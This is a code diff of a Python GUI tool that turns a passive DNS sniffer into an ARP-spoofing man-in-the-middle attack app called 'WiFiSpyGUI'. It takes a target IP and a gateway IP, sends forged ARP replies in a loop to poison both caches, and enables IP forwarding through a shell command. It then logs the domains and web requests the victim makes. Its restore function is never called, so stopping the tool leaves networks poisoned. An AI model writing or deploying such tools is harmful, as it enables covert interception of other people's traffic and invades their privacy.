@@ -2,79 +2,93 @@ import customtkinter as ctk
 from scapy.all import *
 from scapy.layers.dns import DNS, DNSQR
 import threading
+import os
 
-class SiteTrackerSniffer(ctk.CTk):
+class WiFiSpyGUI(ctk.CTk):
     def __init__(self):
         super().__init__()
-
-        self.title("🌐 Live Web Monitor & Sniffer")
-        self.geometry("900x700")
+        self.title("⚡ WiFi Network Monitor (MITM)")
+        self.geometry("1000x700")
         ctk.set_appearance_mode("Dark")
 
         # --- Sidebar ---
-        self.sidebar = ctk.CTkFrame(self, width=200)
+        self.sidebar = ctk.CTkFrame(self, width=250)
         self.sidebar.pack(side="left", fill="y", padx=10, pady=10)
 
-        ctk.CTkLabel(self.sidebar, text="WEB MONITOR", font=("Arial", 20, "bold")).pack(pady=20)
+        ctk.CTkLabel(self.sidebar, text="NETWORK SPY", font=("Arial", 20, "bold")).pack(pady=20)
         
-        self.start_btn = ctk.CTkButton(self.sidebar, text="▶ START MONITOR", fg_color="green", command=self.toggle_monitor)
+        self.target_ip = ctk.CTkEntry(self.sidebar, placeholder_text="Target IP (e.g. 192.168.1.5)")
+        self.target_ip.pack(pady=10, padx=10)
+        
+        self.gateway_ip = ctk.CTkEntry(self.sidebar, placeholder_text="Gateway (Router) IP")
+        self.gateway_ip.pack(pady=10, padx=10)
+
+        self.start_btn = ctk.CTkButton(self.sidebar, text="▶ START ATTACK", fg_color="green", command=self.start_attack)
         self.start_btn.pack(pady=10, padx=10)
 
-        self.stop_btn = ctk.CTkButton(self.sidebar, text="⏹ STOP", fg_color="red", command=self.stop_monitor)
+        self.stop_btn = ctk.CTkButton(self.sidebar, text="⏹ STOP ALL", fg_color="red", command=self.stop_attack)
         self.stop_btn.pack(pady=10, padx=10)
 
-        # --- Main View (Table/List Style) ---
+        # --- Monitor View ---
         self.log_box = ctk.CTkTextbox(self, font=("Consolas", 13), text_color="#00FF00")
         self.log_box.pack(expand=True, fill="both", padx=20, pady=20)
 
-        self.is_monitoring = False
+        self.is_running = False
 
-    def process_packet(self, pkt):
-        if not self.is_monitoring: return
+    def get_mac(self, ip):
+        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
+        if ans: return ans[0][1].hwsrc
+        return None
 
-        # DNS Query detect karke website ka naam nikalna
-        if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
-            try:
-                # Website domain name extract karna
-                qname = pkt.getlayer(DNSQR).qname.decode("utf-8")
-                # Faltu sites filter karne ke liye (Optional)
-                if not any(x in qname for x in ["arpa", "local"]):
-                    log_msg = f"[VISITED] Site: {qname[:-1]} | Client: {pkt[IP].src}"
-                    self.log_to_gui(log_msg)
-            except:
-                pass
+    def spoof(self, target_ip, host_ip):
+        target_mac = self.get_mac(target_ip)
+        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
+        send(packet, verbose=False)
 
-        # HTTP Host header check (Unencrypted traffic ke liye)
+    def restore(self, target_ip, host_ip):
+        target_mac = self.get_mac(target_ip)
+        host_mac = self.get_mac(host_ip)
+        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
+        send(packet, count=4, verbose=False)
+
+    def packet_callback(self, pkt):
+        if pkt.haslayer(DNSQR):
+            domain = pkt[DNSQR].qname.decode()
+            self.log(f"[VISIT] User {pkt[IP].src} ➔ {domain}")
         elif pkt.haslayer(Raw):
-            try:
-                load = pkt[Raw].load.decode('utf-8', errors='ignore')
-                if "Host:" in load:
-                    host = load.split("Host: ")[1].split("\r\n")[0]
-                    self.log_to_gui(f"[HTTP] Host Found: {host}")
-            except:
-                pass
+            data = pkt[Raw].load.decode(errors='ignore')
+            if "GET" in data or "POST" in data:
+                self.log(f"[ACTIVITY] {pkt[IP].src} is browsing web data...")
 
-    def log_to_gui(self, msg):
+    def log(self, msg):
         self.log_box.insert("end", f"{msg}\n")
         self.log_box.see("end")
 
-    def run_sniffer(self):
-        # UDP port 53 (DNS) filter use kar rahe hain speed ke liye
-        sniff(filter="udp port 53 or port 80", prn=self.process_packet, store=0, stop_filter=lambda x: not self.is_monitoring)
+    def attack_thread(self):
+        t_ip = self.target_ip.get()
+        g_ip = self.gateway_ip.get()
+        
+        # IP Forwarding enable karna (Linux)
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+        
+        self.log(f"[*] Attacking {t_ip}... Poisoning ARP Cache.")
+        try:
+            while self.is_running:
+                self.spoof(t_ip, g_ip)
+                self.spoof(g_ip, t_ip)
+                time.sleep(2)
+        except: self.stop_attack()
 
-    def toggle_monitor(self):
-        if not self.is_monitoring:
-            self.is_monitoring = True
-            self.log_to_gui("[*] Monitoring started... Tracking web visits.")
-            threading.Thread(target=self.run_sniffer, daemon=True).start()
+    def start_attack(self):
+        self.is_running = True
+        threading.Thread(target=self.attack_thread, daemon=True).start()
+        threading.Thread(target=lambda: sniff(prn=self.packet_callback, store=0, stop_filter=lambda x: not self.is_running), daemon=True).start()
 
-    def stop_monitor(self):
-        self.is_monitoring = False
-        self.log_to_gui("[!] Monitoring stopped.")
-
-    def clear_logs(self):
-        self.log_box.delete("1.0", "end")
+    def stop_attack(self):
+        self.is_running = False
+        self.log("[!] Stopping attack and restoring network...")
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
 if __name__ == "__main__":
-    app = SiteTrackerSniffer()
+    app = WiFiSpyGUI()
     app.mainloop()
